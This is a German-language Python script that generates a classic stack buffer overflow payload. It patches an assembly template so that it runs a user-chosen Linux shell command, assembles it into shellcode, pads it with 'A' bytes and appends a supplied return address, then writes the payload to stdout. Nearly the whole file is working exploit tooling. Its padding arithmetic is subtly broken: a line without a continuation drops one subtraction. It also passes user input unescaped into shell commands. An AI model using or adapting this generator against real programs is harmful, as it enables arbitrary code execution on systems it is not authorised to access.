#! /usr/bin/python3
import sys
import codecs
import os
import subprocess

if len(sys.argv) == 4:
    try:
        address = codecs.decode(sys.argv[1], "hex")
        address = address[::-1]
    except:
        print("Bitte Adresse in Hexadezimal angeben!")
        sys.exit(0)

    if isinstance(sys.argv[3], str):
        pathParameter = sys.argv[3]
        pathParameterLength = len(pathParameter)
    else:
        print("Bitte Linux Befehl als String angeben!")
        sys.exit(0)

    if os.path.isfile(sys.argv[2]):
        path = sys.argv[2]
        subprocess.run("cp {} script_modified.asm".format(path),
                       shell=True)
        if sys.argv[3].endswith("A"):
            subprocess.run(
                "sed -i 's/0x41/0x42/' script_modified.asm",
                shell=True)
            subprocess.run\
                ("sed -i 's/A/B/' script_modified.asm",
                 shell=True)
        subprocess.run\
            ("sed -i 's/rdx+5/rdx+{}/' script_modified.asm"
             .format(pathParameterLength), shell=True)
        subprocess.run\
            ("sed -i 's#ls -l#{}#' script_modified.asm"
             .format(pathParameter), shell=True)
        subprocess.run\
            (" nasm -f bin script_modified.asm -o a.bin"
             , shell=True)
        subprocess.run\
            ("./dumpshellcode.py a.bin > a.txt"
             , shell=True)
    else:
        print("Datei existiert nicht!")
        sys.exit(0)

    f = open("a.txt", "r+")
    shellcode = f.read()
    shellcode = bytes(shellcode, 'utf-8')
    shellcode = shellcode.decode('unicode_escape')\
        .encode("raw_unicode_escape")
    f.close()

    os.system("rm a.txt")
    os.system("rm a.bin")

    padding_size = 224 - (len(shellcode))
    - (int((len(sys.argv[1]) / 2)) + 2)
    os.write(1, shellcode + b"A" * padding_size + address)
else:
    print("Wie folgt zu Benutzen:", "Programmname:", sys.argv[0],
          "Bufferadresse", "Assemblerprogramm", "'Linux Bash Befehl'")
    sys.exit(0)
